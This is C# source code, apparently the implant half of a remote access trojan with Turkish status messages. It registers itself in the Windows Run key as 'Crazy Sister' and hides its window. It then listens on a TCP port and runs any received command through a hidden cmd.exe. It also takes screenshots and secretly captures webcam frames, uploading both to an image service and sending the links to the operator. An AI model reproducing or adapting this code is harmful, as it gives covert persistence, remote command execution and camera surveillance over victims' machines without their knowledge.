using Emgu.CV;
using Microsoft.Win32;
using Newtonsoft.Json;
using Server.Core;
using Server.Models;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Server
{
    class Program
    {
        public static VideoCapture Capture = new VideoCapture();
        public static Timer InternetWaiter = new Timer()
        {
            Enabled = true,
            Interval = 1000
        };

        static void Main(string[] args)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("Crazy Sister", Application.ExecutablePath);
            WindowHelper.WindowVisibility(false);

            if (args.Length != 0)
            {
                if (args[0] == "--remove")
                    rk.DeleteValue("Crazy Sister", false);
                if (args[0] == "--show")
                    WindowHelper.WindowVisibility(true);
            }

            while (true)
            {
                if (CheckForInternetConnection())
                {
                    StartServer(GetIPAddress());
                    break;
                }
                else
                {
                    Console.WriteLine("Internet bağlantısı bekleniyor...");
                }

                Thread.Sleep(1000);
            }
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        public static IPAddress GetIPAddress()
        {
            IPAddress address = null;

            IPHostEntry ipEntry = Dns.GetHostEntry("127.0.0.1");
            IPAddress[] addr = ipEntry.AddressList;

            for (int i = 0; i < addr.Length; i++)
            {
                var SplittedAddress = addr[i].ToString().Split('.');

                if (SplittedAddress[0] == "192")
                    if (SplittedAddress[1] == "168")
                        if (SplittedAddress[2] == "1")
                            address = IPAddress.Parse(addr[i].ToString());
            }

            return address;
        }

        public static void StartServer(IPAddress ipAddress)
        {
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 16860);

            Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            listener.Bind(localEndPoint);
            listener.Listen(100);

            while (true)
            {
                try
                {
                    Console.WriteLine("Bağlantı bekleniyor...");
                    Socket handler = listener.Accept();

                    string data = null;
                    byte[] bytes = null;

                    while (true)
                    {
                        bytes = new byte[16384];
                        Console.WriteLine(data);
                        int bytesRec = handler.Receive(bytes);
                        data += Encoding.UTF8.GetString(bytes, 0, bytesRec);

                        if (data.IndexOf("<EOF>") > -1)
                            break;
                    }

                    data = data.Substring(0, data.Length - 5);
                    Console.WriteLine("Alınan mesaj: {0}", data);

                    ProcessRequest(JsonConvert.DeserializeObject<Models.Data>(data), handler);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
        }

        public static void ProcessRequest(Data data, Socket handler)
        {
            try
            {
                switch (data.Type)
                {
                    case "CMD":
                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            FileName = "cmd.exe",
                            Arguments = $"/C {data.Contents}"
                        };

                        new Process()
                        {
                            StartInfo = startInfo,
                        }.Start();
                        break;

                    case "MessageBox":
                        var MessageBoxObj = JsonConvert.DeserializeObject<MessageBoxModel>(data.Contents);
                        MessageBox.Show(MessageBoxObj.Description, MessageBoxObj.Title, MessageBoxUtils.BoxButtons[MessageBoxObj.BoxButtons], MessageBoxUtils.BoxIcons[MessageBoxObj.BoxIcon]);
                        break;

                    case "ScreenShot":
                        byte[] ScreenshotBytes = new Core.ScreenCapture().CaptureScreenBytes();
                        string ScreenshotOutput = new API.ImageService().UploadImage(ScreenshotBytes).Result;
                        byte[] ScreenshotMessage = Encoding.UTF8.GetBytes(ScreenshotOutput);
                        handler.Send(ScreenshotMessage);
                        break;

                    case "Camera":
                        var Frame = Capture.QueryFrame();
                        Bitmap image = Frame.Bitmap;
                        ImageConverter converter = new ImageConverter();
                        byte[] CameraBytes = (byte[])converter.ConvertTo(image, typeof(byte[]));
                        string CameraOutput = new API.ImageService().UploadImage(CameraBytes).Result;
                        byte[] CameraMessage = Encoding.UTF8.GetBytes(CameraOutput);
                        handler.Send(CameraMessage);
                        break;

                    default:
                        ProcessStartInfo pStartInfo = new ProcessStartInfo
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            FileName = "cmd.exe",
                            Arguments = $"/C {data.Contents}"
                        };

                        new Process()
                        {
                            StartInfo = pStartInfo,
                        }.Start();
                        break;
                }
            }
            catch (Exception)
            {
                byte[] msg = Encoding.UTF8.GetBytes("Task failed.");
                handler.Send(msg);
                handler.Shutdown(SocketShutdown.Both);
                handler.Close();
            }
            finally
            {
                byte[] msg = Encoding.UTF8.GetBytes("OK.");
                handler.Send(msg);
                handler.Shutdown(SocketShutdown.Both);
                handler.Close();
            }
        }
    }
}
